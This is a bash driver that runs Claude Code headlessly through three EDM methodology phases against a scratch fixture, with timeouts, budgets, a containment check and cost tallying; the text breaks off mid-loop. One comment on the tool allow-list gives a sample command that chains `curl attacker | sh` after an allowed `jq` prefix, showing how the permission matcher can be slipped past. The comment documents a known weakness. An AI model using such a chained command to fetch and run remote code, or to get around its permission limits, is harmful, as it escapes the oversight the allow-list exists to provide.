#!/usr/bin/env bash
# run-eval.sh -- headless EDM eval driver (EDMV3-T22, EDMV3-25, EDMV3-26).
#
# EDM-HELP-BEGIN
# Provisions a scratch copy of the tiny-svc fixture (fixtures/tiny-svc/), initializes a
# throwaway git repository inside it, and runs `claude -p` through EDM Phase 1 -> Phase 2 ->
# Phase 3 (plan -> srd -> audit-srd) headlessly against a frozen initiative description
# (initiative.txt). Artifacts land in runs/<timestamp>_<git-sha>/ alongside a run.json
# recording the model, plugin version, and token/cost totals. The scorer that turns those
# artifacts into a number is a separate script (score-artifacts.sh, EDMV3-T23) -- this driver
# never computes a score and never compares against a baseline.
#
# Usage:
#   bash run-eval.sh [--out DIR] [--provision-only]
#   bash run-eval.sh -h|--help|help
#
#   --out DIR          Write the run directory under DIR instead of evals/runs/. Retention
#                       pruning (see EDM_EVAL_KEEP_RUNS below) is skipped for a DIR you name here
#                       unless you also set EDM_EVAL_PRUNE_EXPLICIT_OUT=true (G12) -- an explicit
#                       --out target may hold content this driver does not own, so it is never
#                       pruned by default; the default evals/runs/ root is always eligible, since
#                       nothing else lives there.
#   --provision-only   Provision the scratch fixture tree and print its path, then exit 0.
#                       Makes no network call and requires no ANTHROPIC_API_KEY. This is the
#                       self-contained, no-network mode described in evals/README.md and
#                       exercised with the network disabled (unshare -rn on Linux, a poisoned
#                       proxy on macOS).
#
# Environment (all optional overrides):
#   ANTHROPIC_API_KEY             Optional explicit auth path for a real run. If unset, an already
#                                 authenticated `claude` CLI is also accepted. `--provision-only`
#                                 needs neither.
#   EDM_EVAL_MODEL                claude -p --model value.               Default: opus
#   EDM_EVAL_PHASE_TIMEOUT_SECONDS Per-phase wall-clock timeout, seconds. Default: 2700
#   EDM_EVAL_MAX_BUDGET_USD        claude -p --max-budget-usd, per phase. Default: 15
#   EDM_EVAL_KEEP_RUNS             Retention: run-shaped directories kept under OUT_ROOT (oldest
#                                 pruned first, on every exit path -- success, partial, or
#                                 interrupted). Only directories matching the run-ID naming shape
#                                 (<timestamp>_<git-sha>) are ever counted or pruned; unrelated
#                                 files and directories always survive.       Default: 10
#   EDM_EVAL_PRUNE_EXPLICIT_OUT    Set to "true" to allow retention pruning against a
#                                 caller-supplied --out DIR (see --out above).  Default: false
#
# Exit codes (the four-value contract, EDMV3-26 / EDMV3-T22 AC10):
#   0  the run completed (reached the end of the audit-srd phase) and the containment check
#      is clean. This is *not* a quality verdict -- run score-artifacts.sh separately for that.
#   1  reserved for the scorer/CI comparison (score-artifacts.sh and its caller, EDMV3-T23 /
#      EDMV3-T39). This script never emits exit 1 itself -- it does not run the scorer.
#   2  a usage or environment error: no working Claude auth, a missing required binary, bad
#      flags, a provisioning failure before any phase started, or a containment violation
#      detected after a run that otherwise completed all three phases.
#   4  a partially completed run: at least one phase did not finish (timeout, non-zero exit,
#      or a missing expected artifact) so the run never reached the final (audit-srd) phase.
#      run.json and a stub scores.json are written with complete: false so CI refuses to
#      compare this run against the baseline.
# EDM-HELP-END
# CA-074: -e is intentionally omitted -- this driver's whole exit-code contract (0/1/2/4, see
# above) depends on continuing past a failed or timed-out phase so it can still write run.json
# and a stub scores.json with complete:false (exit 4) instead of the phase failure aborting the
# script before that bookkeeping runs. Every `read -d ''` heredoc capture below is separately
# guarded with `|| true` for the same reason (a `read -d ''` that hits EOF without its delimiter
# exits non-zero by design, not by error).
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
EVALS_DIR="$SCRIPT_DIR"
EDM_PLUGIN_DIR="$(cd "$EVALS_DIR/.." && pwd)"
EDM_BIN_DIR="$EDM_PLUGIN_DIR/bin"
FIXTURE_DIR="$EVALS_DIR/fixtures/tiny-svc"
INITIATIVE_FILE="$EVALS_DIR/initiative.txt"

# CA-005: shared --help extractor, sourced rather than hand-copied. G66: standardized on the
# same `${SCRIPT_DIR}/../bin/_edm-cli-lib.sh` form the other two evals/ drivers
# (score-artifacts.sh, tiering-matrix.sh) already use, rather than this file's own
# EDM_BIN_DIR-relative variant.
source "${SCRIPT_DIR}/../bin/_edm-cli-lib.sh"

export PATH="$EDM_BIN_DIR:$PATH"

# G21/CA-074: two-argument form -- see bin/edm-validate-prefix's die() for the full rationale.
# Family-standard default of 2 (usage/environment error).
die() {
  local msg="$1" code="${2:-2}"
  echo "run-eval: $msg" >&2
  exit "$code"
}

usage() {
  print_help "${BASH_SOURCE[0]:-$0}"
}

# --- Flag parsing --------------------------------------------------------------------------
OUT_ROOT="$EVALS_DIR/runs"
# G12: OUT_ROOT_EXPLICIT distinguishes "the caller pointed --out at a directory they chose" from
# "the default evals/runs/ root" -- the retention prune below (prune_old_runs) only ever touches
# a caller-chosen root when the caller also opts in via EDM_EVAL_PRUNE_EXPLICIT_OUT=true, since
# nothing but this driver's own run directories can live under the default root.
OUT_ROOT_EXPLICIT=false
PROVISION_ONLY=false
while [ $# -gt 0 ]; do
  case "$1" in
    --out)
      [ $# -ge 2 ] || die "--out requires a value"
      OUT_ROOT="$2"; OUT_ROOT_EXPLICIT=true; shift 2 ;;
    --provision-only)
      PROVISION_ONLY=true; shift ;;
    -h|--help|help)
      usage; exit 0 ;;
    *)
      die "unknown argument: $1 (see --help)" ;;
  esac
done

[ -d "$FIXTURE_DIR" ] || die "fixture tree not found at $FIXTURE_DIR"
[ -f "$INITIATIVE_FILE" ] || die "frozen initiative file not found at $INITIATIVE_FILE"

# --- State shared with the cleanup trap -----------------------------------------------------
SCRATCH_DIR=""
RUN_DIR=""
RUN_ID=""
TS=""
GIT_SHA=""
PLUGIN_VERSION=""
CLAUDE_MODEL=""
PREFIX=""
STARTED=false
COMPLETE=false
LAST_PHASE_ATTEMPTED="none"
CURRENT_CHILD_PID=""

# write_partial_artifacts -- called only from cleanup(), only when a run started but never
# reached the final phase. run.json is this driver's own record; scores.json here is a stub,
# not the real scorer's output (score-artifacts.sh, EDMV3-T23, never runs against an
# incomplete artifact tree) -- it exists purely so CI can see complete: false and refuse the
# baseline comparison without needing to invoke the real scorer on a run with nothing to score.
write_partial_artifacts() {
  [ -n "$RUN_DIR" ] || return 0
  mkdir -p "$RUN_DIR" 2>/dev/null
  jq -n \
    --arg run_id "${RUN_ID:-unknown}" \
    --arg timestamp "${TS:-unknown}" \
    --arg git_sha "${GIT_SHA:-unknown}" \
    --arg plugin_version "${PLUGIN_VERSION:-unknown}" \
    --arg model "${CLAUDE_MODEL:-unknown}" \
    --arg prefix "${PREFIX:-unknown}" \
    --arg last_phase "${LAST_PHASE_ATTEMPTED}" \
    '{run_id: $run_id, timestamp: $timestamp, git_sha: $git_sha, plugin_version: $plugin_version,
      model: $model, complete: false, prefix: $prefix, last_phase_attempted: $last_phase}' \
    > "$RUN_DIR/run.json" 2>/dev/null
  jq -n \
    --arg reason "run did not reach the final phase (audit-srd); last phase attempted: ${LAST_PHASE_ATTEMPTED}" \
    '{complete: false, dimensions_scored: 0, dimensions: [], total: null, reason: $reason,
      note: "stub written by run-eval.sh; the real scorer (score-artifacts.sh, EDMV3-T23) never scores an incomplete run"}' \
    > "$RUN_DIR/scores.json" 2>/dev/null
  echo "run-eval: partial run -- wrote $RUN_DIR/run.json and $RUN_DIR/scores.json (complete: false)" >&2
}

# prune_old_runs -- retention (CA-066, G12, G54): removes stale run-shaped directories under
# OUT_ROOT, keeping the EDM_EVAL_KEEP_RUNS most recent. Called from cleanup() below, which the
# EXIT/INT/TERM trap runs on every exit path -- success, partial (exit 4), or interrupted -- so a
# failed or killed run's directory is retention-managed too (G54), not only the success path.
# The run directory currently being investigated is always the newest by mtime, so it is never
# eligible for pruning regardless of which path got here.
#
# Ownership filter (G12, defect 1): only directories matching the RUN_ID naming shape
# (${TS}_${GIT_SHA}, e.g. 20260101T000000Z_abc1234) are ever considered stale-eligible -- an
# unrelated directory or a stray file living under a user-supplied --out root is never touched,
# counted, or allowed to consume a keep-window slot.
#
# Explicit-root opt-in (G12): when --out pointed at a directory the caller chose (OUT_ROOT_EXPLICIT),
# pruning is skipped unless EDM_EVAL_PRUNE_EXPLICIT_OUT=true is also set. The default evals/runs/
# root is always eligible, since nothing else can be living there.
prune_old_runs() {
  if [ "$OUT_ROOT_EXPLICIT" = "true" ]; then
    local prune_explicit="${EDM_EVAL_PRUNE_EXPLICIT_OUT:-false}"
    [ "$prune_explicit" = "true" ] || return 0
  fi
  [ -d "$OUT_ROOT" ] || return 0

  local keep="${EDM_EVAL_KEEP_RUNS:-10}"
  case "$keep" in
    ''|*[!0-9]*) keep=10 ;;
  esac

  # ls -t sorts newest-first by mtime (bash-3.2/BSD-safe -- no GNU-only `find -printf`); the
  # grep restricts the listing to run-shaped entries (defect 1 above) before either counting or
  # windowing, so a stray file or unrelated directory in OUT_ROOT can never consume a protected
  # slot or shift the window (defect 2, the off-by-N half of G12 -- the prior code counted with
  # `find -type d` but windowed with unfiltered `ls -1t`, so the two disagreed whenever OUT_ROOT
  # held anything that was not itself a run directory).
  local run_dirs run_total stale_dirs pruned=0
  run_dirs="$(ls -1t "$OUT_ROOT" 2>/dev/null | grep -E '^[0-9]{8}T[0-9]{6}Z_' || true)"
  # G29 (CA-260): no `${run_total:-0}` default here -- `grep -c .` always prints a digit (0 on no
  # match), so the fallback is unreachable dead code (the same CA-140/CA-202 class already
  # accepted elsewhere in this file).
  run_total="$(printf '%s\n' "$run_dirs" | grep -c . || true)"
  [ "$run_total" -gt "$keep" ] || return 0

  # `tail -n +K` idiom (not `head -n -N`, a GNU-only form) drops the K-1 newest and keeps the
  # stale tail.
  stale_dirs="$(printf '%s\n' "$run_dirs" | tail -n "+$((keep + 1))")"
  while IFS= read -r stale; do
    [ -n "$stale" ] || continue
    [ -d "$OUT_ROOT/$stale" ] || continue
    rm -rf "${OUT_ROOT:?}/$stale"
    pruned=$((pruned + 1))
  done <<PRUNE_EOF
$stale_dirs
PRUNE_EOF
  if [ "$pruned" -gt 0 ]; then
    echo "run-eval: pruned ${pruned} old run director(ies), keeping the ${keep} most recent under $OUT_ROOT (override with EDM_EVAL_KEEP_RUNS)" >&2
  fi
  return 0
}

# G7 (CA-252, round-4 pass-4): cleanup() is now the EXIT-trap body ONLY. It never decides a
# signal's exit code itself -- that decision belongs to the dedicated INT/TERM/HUP wrappers
# below, matching the idiom `bin/edm-state`'s own `write_atomic` function already uses at its
# trap layer (`trap '...' EXIT`, `trap '...; exit 130' INT`, `trap '...; exit 143' TERM`,
# `trap '...; exit 129' HUP` -- cited by function name, not line number, per CA-315/G39: a
# line-range citation here has already gone stale twice). Previously `trap cleanup EXIT INT TERM`
# installed this SAME function directly as the INT/TERM handler too; since `set -e` is
# deliberately off (see the CA-074 note above), a signal trap that falls through to
# `return "$ec"` instead of exiting resumes the interrupted script -- a Ctrl-C before
# STARTED=true deleted SCRATCH_DIR and then execution continued against a directory that no
# longer existed, surfacing a misleading "no working Claude auth" error for what was a user
# interrupt. The CLEANUP_DONE latch also made a second Ctrl-C a no-op, so the driver became
# uninterruptible after the first press.
#
# The one exception, kept deliberately (G7 fix step 3): when a run already reached STARTED=true
# but never reached COMPLETE=true, cleanup() still decides that outcome is exit 4 -- the
# documented partial-run contract (AC10) applies uniformly whether that state was reached by
# falling through the main script body (the explicit `exit 4` at PHASE3_OK != true, below) or by
# an INT/TERM/HUP interrupt arriving mid-run. That `exit 4` call fires the EXIT trap a second
# time via bash's own signal-to-EXIT propagation; the CLEANUP_DONE guard makes that second entry
# a no-op rather than a double prune, so write_partial_artifacts and prune_old_runs each run
# exactly once no matter which of the four exit paths (normal, INT, TERM, HUP) got here.
CLEANUP_DONE=false
cleanup() {
  local ec=$?
  [ "$CLEANUP_DONE" = "true" ] && return "$ec"
  CLEANUP_DONE=true
  if [ -n "$CURRENT_CHILD_PID" ]; then
    kill -TERM "$CURRENT_CHILD_PID" 2>/dev/null
    sleep 1
    kill -KILL "$CURRENT_CHILD_PID" 2>/dev/null
  fi
  if [ -n "$SCRATCH_DIR" ] && [ -d "$SCRATCH_DIR" ] && [ "$PROVISION_ONLY" != "true" ]; then
    rm -rf "$SCRATCH_DIR"
  fi
  if [ "$STARTED" = "true" ] && [ "$COMPLETE" != "true" ]; then
    write_partial_artifacts
    prune_old_runs
    exit 4
  fi
  prune_old_runs
  return "$ec"
}
trap cleanup EXIT
trap 'cleanup; exit 130' INT
trap 'cleanup; exit 143' TERM
trap 'cleanup; exit 129' HUP

# --- Provision a scratch copy of the fixture, as a fresh git repository ---------------------
provision_scratch() {
  SCRATCH_DIR="$(mktemp -d)" || die "mktemp -d failed"
  cp -R "$FIXTURE_DIR"/. "$SCRATCH_DIR"/ || die "failed to copy fixture into scratch tree"
  (
    cd "$SCRATCH_DIR" || exit 1
    git init -q
    git add -A
    git -c user.email="edm-eval@local" -c user.name="edm-eval" \
      commit -q -m "tiny-svc fixture: frozen baseline commit"
  ) || die "failed to initialize scratch git repository at $SCRATCH_DIR"
}

# --provision-only never touches ANTHROPIC_API_KEY or the network: it provisions the scratch
# tree and exits, before any credential or binary check below (AC4).
if [ "$PROVISION_ONLY" = "true" ]; then
  provision_scratch
  echo "$SCRATCH_DIR"
  exit 0
fi

# run_with_timeout <seconds> <outfile> <errfile> <cmd...> -- portable bash-3.2 timeout with no
# dependency on GNU coreutils' `timeout` (absent by default on macOS). Backgrounds <cmd...>,
# polls once a second, and sends TERM then KILL if <seconds> elapses before it exits. Returns
# 124 on timeout (matching GNU timeout's convention), else the command's own exit status.
# Defined here, ahead of the auth probe below (G45), rather than down by the phase invocations --
# the probe is this driver's first network call and needs the same bound every later `claude -p`
# invocation gets; defining it only after the probe left the probe unbounded.
run_with_timeout() {
  local seconds="$1" outfile="$2" errfile="$3"; shift 3
  "$@" >"$outfile" 2>"$errfile" &
  CURRENT_CHILD_PID=$!
  local pid="$CURRENT_CHILD_PID" waited=0
  while kill -0 "$pid" 2>/dev/null; do
    if [ "$waited" -ge "$seconds" ]; then
      kill -TERM "$pid" 2>/dev/null
      sleep 2
      kill -KILL "$pid" 2>/dev/null
      wait "$pid" 2>/dev/null
      CURRENT_CHILD_PID=""
      return 124
    fi
    sleep 1
    waited=$((waited + 1))
  done
  wait "$pid"
  local rc=$?
  CURRENT_CHILD_PID=""
  return "$rc"
}

# --- Environment / credential requirements (AC8, amended by D20) ----------------------------
# Two sanctioned auth paths: an exported ANTHROPIC_API_KEY, or a `claude` CLI that is already
# authenticated (subscription/OAuth login). The original env-var-only gate was a false
# precondition on logged-in developer machines and CI images using CLI auth (D15 rework,
# recorded as D20 in the initiative's decisions.md). The driver still refuses to start a run
# with no working auth at all, preserving AC8's substance: no half-run against a dead backend.
for bin in claude jq git; do
  command -v "$bin" >/dev/null 2>&1 || die "required binary not found on PATH: $bin"
done

if [ -z "${ANTHROPIC_API_KEY:-}" ]; then
  # G45: every other model call in this driver goes through run_with_timeout; this auth probe
  # is the one that didn't, so a hung connection blocked indefinitely, the driver never reached
  # its "started" state, and the whole CI job eventually failed as an opaque timeout with no
  # run.json ever written. 60s is generous for a one-line haiku reply and far below any phase
  # timeout, so a genuinely working auth path is never mistaken for a dead one.
  if ! run_with_timeout 60 /dev/null /dev/null claude -p "Reply with exactly: OK" --model haiku; then
    die "no working Claude auth: ANTHROPIC_API_KEY is not set and the 'claude' CLI is not authenticated. Export ANTHROPIC_API_KEY or run 'claude' interactively to log in. Use --provision-only to exercise fixture provisioning without auth."
  fi
fi

# --- Parse the frozen initiative description ------------------------------------------------
PREFIX="$(sed -n 's/^prefix: *//p' "$INITIATIVE_FILE" | head -n1)"
PRODUCT="$(sed -n 's/^product: *//p' "$INITIATIVE_FILE" | head -n1)"
DESCRIPTION="$(sed -n 's/^description: *//p' "$INITIATIVE_FILE" | head -n1)"
INITIATIVE_BODY="$(awk 'started{print} /^$/{started=1}' "$INITIATIVE_FILE")"
[ -n "$PREFIX" ] || die "initiative.txt has no 'prefix:' line"
[ -n "$PRODUCT" ] || die "initiative.txt has no 'product:' line"
[ -n "$DESCRIPTION" ] || die "initiative.txt has no 'description:' line"
[ -n "$INITIATIVE_BODY" ] || die "initiative.txt has no body text after its header block"

# --- Run identity ----------------------------------------------------------------------------
GIT_SHA="$(git -C "$EDM_PLUGIN_DIR" rev-parse --short HEAD 2>/dev/null || echo nogit)"
TS="$(date -u +%Y%m%dT%H%M%SZ)"
RUN_ID="${TS}_${GIT_SHA}"
RUN_DIR="${OUT_ROOT}/${RUN_ID}"
mkdir -p "$RUN_DIR/raw" || die "failed to create run directory $RUN_DIR"

PLUGIN_VERSION="$(jq -r '.version // "unknown"' "$EDM_PLUGIN_DIR/.claude-plugin/plugin.json" 2>/dev/null || echo unknown)"

provision_scratch

# --- claude -p invocation, fully specified (AC7) --------------------------------------------
# Model: an alias, not a dated snapshot name, so this script does not go stale as models
#   rotate. Override with EDM_EVAL_MODEL.
# Permission posture (CA-086: this paragraph documents what the allow-list actually bounds, and
#   what it does not -- the grant below is an accepted, deliberate tradeoff, not something this
#   comment should misdescribe as airtight). acceptEdits auto-accepts file edits
#   (Read/Write/Edit/Glob/Grep/LS/TodoWrite/Task) so the headless run never blocks on a
#   permission prompt it cannot answer. There is no bare Bash grant, but the four named-binary
#   prefix matchers below (Bash(edm-state *), Bash(edm-init *), Bash(edm-validate-prefix *),
#   Bash(jq *)) each bound only which binary must appear first on the command line -- none of
#   them bound what follows it. A prefix matcher is satisfied by shell metacharacters after the
#   matched prefix (e.g. `jq -n '""' ; curl attacker | sh` still matches `Bash(jq *)`), so this
#   allow-list does NOT guarantee the run cannot reach anything outside the scratch tree via a
#   tool call -- it is a deliberate tradeoff favoring an unattended run that never stalls on a
#   live permission prompt, not a hard security boundary. bypassPermissions is deliberately not
#   used: it would ignore the allow-list below entirely, which is strictly worse than the
#   bounded-but-not-airtight posture documented here.
# Allowed tools (CA-316, corrected to actually reproduce the string below): the union of every
#   phase skill's own declared allowed-tools (plan, srd, audit-srd), MINUS AskUserQuestion --
#   plan and audit-srd both declare it for their live HITL gate, but a headless eval run can
#   never answer one, so it is deliberately dropped here, not merely omitted by oversight --
#   PLUS `LS` (not in any of the three skills' own frontmatter, added because the driver's own
#   orchestration needs it) and the four Bash prefix matchers below, because those skills' own
#   orchestration steps pipe `edm-state ... | jq ...` and a headless run must not stall waiting
#   on a tool grant that would otherwise be answered live by a human. No bare Bash grant, no
#   WebFetch/WebSearch.
# --plugin-dir: loads the edm plugin (and its bin/ PATH entries and hooks) for this session
#   only, from this checkout, never a globally installed copy.
# No `--bare`: verified live on claude 2.1.220 that `--bare` strips stored subscription/OAuth
#   credentials and turns an otherwise valid logged-in machine into "Not logged in". This driver
#   uses `--no-session-persistence` for session isolation and permits either auth path described
#   above.
# --max-budget-usd: a hard per-phase spend ceiling, independent of the wall-clock timeout.
# --no-session-persistence: an eval run never needs to be resumed via `claude --resume`.
CLAUDE_MODEL="${EDM_EVAL_MODEL:-opus}"
CLAUDE_PERMISSION_MODE="acceptEdits"
CLAUDE_ALLOWED_TOOLS="Read Write Edit Glob Grep LS TodoWrite Task Bash(edm-state *) Bash(edm-init *) Bash(edm-validate-prefix *) Bash(jq *)"
CLAUDE_DISALLOWED_TOOLS="WebFetch WebSearch KillShell BashOutput"
PHASE_TIMEOUT_SECONDS="${EDM_EVAL_PHASE_TIMEOUT_SECONDS:-2700}"
PHASE_MAX_BUDGET_USD="${EDM_EVAL_MAX_BUDGET_USD:-15}"

# invoke_claude <phase-key> <prompt> -- runs claude -p for one phase, cwd'd into the scratch
# tree, writing raw stdout/stderr under $RUN_DIR/raw/ for later token/cost aggregation.
#
# Deliberately does NOT wrap the `cd` + claude invocation in a "(...)" subshell: run_with_timeout
# backgrounds "$@" with a bare `&` and records $! in CURRENT_CHILD_PID. If that background happens
# inside a subshell, CURRENT_CHILD_PID is only ever visible inside that subshell's own copy of the
# variable -- the top-level EXIT/INT/TERM trap (running in *this* process) would then have no real
# PID to kill on an interrupted run, leaking an orphaned `claude` process. Saving and restoring PWD
# by hand keeps everything in the same process instead.
invoke_claude() {
  local phase_key="$1" prompt="$2" rc prev_dir="$PWD"
  cd "$SCRATCH_DIR" || return 1
  # Scrub parent Claude Code session variables. When this driver itself runs inside a Claude
  # Code session (an agent driving the eval, or a hook), the child `claude -p` inherits the
  # parent's session identifiers and attaches to its state -- observed live as an instant
  # (77ms) budget_exhausted because the child adopted the parent session's cumulative spend.
  # `env -u` each known session var so every phase is a genuinely fresh headless run.
  run_with_timeout "$PHASE_TIMEOUT_SECONDS" \
    "$RUN_DIR/raw/${phase_key}.json" "$RUN_DIR/raw/${phase_key}.stderr.log" \
    env -u CLAUDECODE -u CLAUDE_CODE_SSE_PORT -u CLAUDE_CODE_ENTRYPOINT \
        -u CLAUDE_CODE_BRIDGE_SESSION_ID -u CLAUDE_CODE_SESSION_ID \
        -u CLAUDE_CODE_CHILD_SESSION -u CLAUDE_CODE_EXECPATH -u CLAUDE_PID \
    claude -p "$prompt" \
    --model "$CLAUDE_MODEL" \
    --permission-mode "$CLAUDE_PERMISSION_MODE" \
    --allowedTools "$CLAUDE_ALLOWED_TOOLS" \
    --disallowedTools "$CLAUDE_DISALLOWED_TOOLS" \
    --plugin-dir "$EDM_PLUGIN_DIR" \
    --output-format json \
    --no-session-persistence \
    --max-budget-usd "$PHASE_MAX_BUDGET_USD"
  # NOTE: no --bare. It isolates the CLI from user config INCLUDING stored credentials, which
  # turns every phase into "Not logged in" on subscription-auth machines (verified live,
  # claude 2.1.220). --no-session-persistence provides the isolation this driver needs.
  rc=$?
  cd "$prev_dir" || true
  return "$rc"
}

STARTED=true
LAST_PHASE_ATTEMPTED="plan"

# EDM_SRD_ROOT is exported *after* provisioning and *before* any claude invocation so both the
# subprocess and this driver shell's own edm-state calls resolve inside the scratch tree,
# regardless of the working directory either one happens to be in.
export EDM_SRD_ROOT="$SCRATCH_DIR/SRD"

echo "run-eval: run $RUN_ID starting (prefix=$PREFIX model=$CLAUDE_MODEL)" >&2

# --- Phase 1: plan ---------------------------------------------------------------------------
# NOTE: built with `read -r -d ''` rather than `VAR="$(cat <<EOF ... EOF)"`. A heredoc nested
# inside a $(...) command substitution mis-parses on an apostrophe in the body text (a known
# bash quoting interaction, reproduced independently of this script) -- `read` avoids the
# command-substitution layer entirely while still allowing $-expansion in the body.
read -r -d '' PHASE1_PROMPT <<EOF || true
You are running EDM Phase 1 (Planning & Discovery) for a headless, unattended evaluation run
of the EDM methodology. This is not an interactive session: there is no human who can answer a
question, so you must never call AskUserQuestion and never wait for a reply.

Follow skills/plan/SKILL.md Operational Orchestration steps 1 through 8 exactly, for
initiative prefix ${PREFIX} and this initiative description:

---
${INITIATIVE_BODY}
---

This is a brand-new initiative. Where step 2 or step 3 would normally interact with a human
(checking whether to resume an existing initiative, or prompting for a product name and
description slug), do not ask: use product "${PRODUCT}" and description slug "${DESCRIPTION}"
for edm-init without prompting.

Perform work only through writing planning.md, running edm-state phase-complete ${PREFIX} 1,
and running edm-state write-handoff ${PREFIX}. Do NOT perform the HITL Gate 1 presentation (no
AskUserQuestion, no STOP and WAIT text, no waiting for sign-off) and do NOT call edm-state
approve-gate yourself -- the eval driver pre-seeds that approval once this invocation ends.

When planning.md has been written and phase-complete has run, print the single line
EVAL_PHASE_COMPLETE: plan and end your turn. Do not do anything else afterward.
EOF

if invoke_claude plan "$PHASE1_PROMPT"; then
  INIT_DIR="$(edm-state resolve-dir "$PREFIX" 2>/dev/null || true)"
  if [ -n "$INIT_DIR" ] && [ -f "$INIT_DIR/planning.md" ]; then
    cp "$INIT_DIR/planning.md" "$RUN_DIR/planning.md"
    edm-state approve-gate "$PREFIX" 1 >/dev/null 2>&1
    PHASE1_OK=true
  else
    echo "run-eval: phase plan did not produce planning.md" >&2
    PHASE1_OK=false
  fi
else
  echo "run-eval: phase plan failed or timed out" >&2
  PHASE1_OK=false
fi

# --- Phase 2: srd ------------------------------------------------------------------------
PHASE2_OK=false
if [ "$PHASE1_OK" = "true" ]; then
  LAST_PHASE_ATTEMPTED="srd"
  read -r -d '' PHASE2_PROMPT <<EOF || true
You are running EDM Phase 2 (SRD Creation) for the same headless evaluation run, initiative
prefix ${PREFIX}. Gate 1 has already been approved by the eval driver. This is not an
interactive session: never call AskUserQuestion and never wait for a reply.

Follow skills/srd/SKILL.md Operational Orchestration steps 1 through 7 exactly, through
running edm-state phase-complete ${PREFIX} 2. Step 8 there says to proceed automatically to
/edm:audit-srd ${PREFIX} -- do NOT do that in this invocation. The eval driver invokes Phase 3
itself, separately, so it can enforce its own timeout.

When srd.md and architecture.md have both been written and phase-complete has run, print the
single line EVAL_PHASE_COMPLETE: srd and end your turn. Do not invoke /edm:audit-srd and do not
do anything else afterward.
EOF
  if invoke_claude srd "$PHASE2_PROMPT"; then
    INIT_DIR="$(edm-state resolve-dir "$PREFIX" 2>/dev/null || true)"
    if [ -n "$INIT_DIR" ] && [ -f "$INIT_DIR/srd.md" ]; then
      cp "$INIT_DIR/srd.md" "$RUN_DIR/srd.md"
      [ -f "$INIT_DIR/architecture.md" ] && cp "$INIT_DIR/architecture.md" "$RUN_DIR/architecture.md"
      PHASE2_OK=true
    else
      echo "run-eval: phase srd did not produce srd.md" >&2
    fi
  else
    echo "run-eval: phase srd failed or timed out" >&2
  fi
fi

# --- Phase 3: audit-srd --------------------------------------------------------------------
PHASE3_OK=false
if [ "$PHASE2_OK" = "true" ]; then
  LAST_PHASE_ATTEMPTED="audit-srd"
  read -r -d '' PHASE3_PROMPT <<EOF || true
You are running EDM Phase 3 (SRD Audit) for the same headless evaluation run, initiative
prefix ${PREFIX}. This is the final phase of this evaluation run. This is not an interactive
session: never call AskUserQuestion and never wait for a reply.

Follow skills/audit-srd/SKILL.md Operational Orchestration steps 1 through 8 exactly, through
running edm-state phase-complete ${PREFIX} 3. Do NOT perform step 9 (the HITL Gate 2
presentation: no AskUserQuestion, no STOP and WAIT text, no waiting for sign-off) and do NOT
call edm-state approve-gate yourself.

HEADLESS CONSTRAINT on subagents: do NOT spawn background subagents -- a headless run ends
the moment you end your turn, and any still-running background auditor dies with it (observed
live: a run that ended "waiting on the three auditors" produced no audit-srd.md at all). Either
perform the audit yourself in this context, or spawn auditors strictly synchronously and only
continue after their results are in your transcript. audit-srd.md must exist on disk, written
by you, before you end your turn.

When audit-srd.md has been written and all P0/P1 findings have been remediated in srd.md,
print the single line EVAL_PHASE_COMPLETE: audit-srd and end your turn.
EOF
  if invoke_claude audit-srd "$PHASE3_PROMPT"; then
    INIT_DIR="$(edm-state resolve-dir "$PREFIX" 2>/dev/null || true)"
    if [ -n "$INIT_DIR" ] && [ -f "$INIT_DIR/audit-srd.md" ]; then
      cp "$INIT_DIR/audit-srd.md" "$RUN_DIR/audit-srd.md"
      [ -f "$INIT_DIR/srd.md" ] && cp "$INIT_DIR/srd.md" "$RUN_DIR/srd.md"
      PHASE3_OK=true
    else
      echo "run-eval: phase audit-srd did not produce audit-srd.md" >&2
    fi
  else
    echo "run-eval: phase audit-srd failed or timed out" >&2
  fi
fi

if [ "$PHASE3_OK" != "true" ]; then
  # STARTED is true and COMPLETE stays false; the EXIT trap writes the partial run.json /
  # scores.json stub and exits 4 (AC10). Nothing further to do here.
  exit 4
fi

# All three phases produced their artifacts -- this run is complete regardless of what the
# containment check below finds (a containment violation is an environment problem, exit 2,
# distinct from a partial run, exit 4).
COMPLETE=true

# --- Containment check (AC9, EDMV3-93) -------------------------------------------------------
# Every file the three phases were expected to create lives under SRD/ inside the scratch
# tree (product-scoped layout: SRD/<product>/<PREFIX>__<description>/...). Anything else that
# shows up in `git status --porcelain` is a stray mutation outside the expected artifact paths.
containment_status=0
containment_output="$(cd "$SCRATCH_DIR" && git status --porcelain 2>/dev/null)" || containment_status=$?
if [ "$containment_status" -ne 0 ]; then
  die "post-run cleanliness check could not read git status from the scratch tree"
fi

CONTAINMENT_VIOLATIONS=""
while IFS= read -r line; do
  [ -z "$line" ] && continue
  xy="${line%%"${line#??}"}"
  path="${line:3}"
  case "$xy" in
    R*|C*) path="${path##* -> }" ;;  # porcelain rename/copy: the destination is what matters
  esac
  case "$path" in
    SRD/*) ;;
    *) CONTAINMENT_VIOLATIONS="${CONTAINMENT_VIOLATIONS}${line}
" ;;
  esac
done <<CONTAINMENT_EOF
${containment_output}
CONTAINMENT_EOF

if [ -n "$CONTAINMENT_VIOLATIONS" ]; then
  echo "containment: VIOLATION" >&2
  echo "$CONTAINMENT_VIOLATIONS" >&2
  die "post-run cleanliness check found files outside SRD/ in the scratch tree"
fi
echo "containment: clean"

# --- Aggregate tokens and cost across the three raw claude -p JSON results ------------------
TOTAL_INPUT=0
TOTAL_OUTPUT=0
TOTAL_CACHE_READ=0
TOTAL_CACHE_CREATE=0
TOTAL_COST="0.000000"
for raw in "$RUN_DIR"/raw/*.json; do
  [ -f "$raw" ] || continue
  in_tok=$(jq -r '.usage.input_tokens // 0' "$raw" 2>/dev/null); in_tok="${in_tok:-0}"
  out_tok=$(jq -r '.usage.output_tokens // 0' "$raw" 2>/dev/null); out_tok="${out_tok:-0}"
  cr_tok=$(jq -r '.usage.cache_read_input_tokens // 0' "$raw" 2>/dev/null); cr_tok="${cr_tok:-0}"
  cc_tok=$(jq -r '.usage.cache_creation_input_tokens // 0' "$raw" 2>/dev/null); cc_tok="${cc_tok:-0}"
  cost=$(jq -r '.total_cost_usd // 0' "$raw" 2>/dev/null); cost="${cost:-0}"
  case "$in_tok" in ''|*[!0-9]*) in_tok=0 ;; esac
  case "$out_tok" in ''|*[!0-9]*) out_tok=0 ;; esac
  case "$cr_tok" in ''|*[!0-9]*) cr_tok=0 ;; esac
  case "$cc_tok" in ''|*[!0-9]*) cc_tok=0 ;; esac
  TOTAL_INPUT=$((TOTAL_INPUT + in_tok))
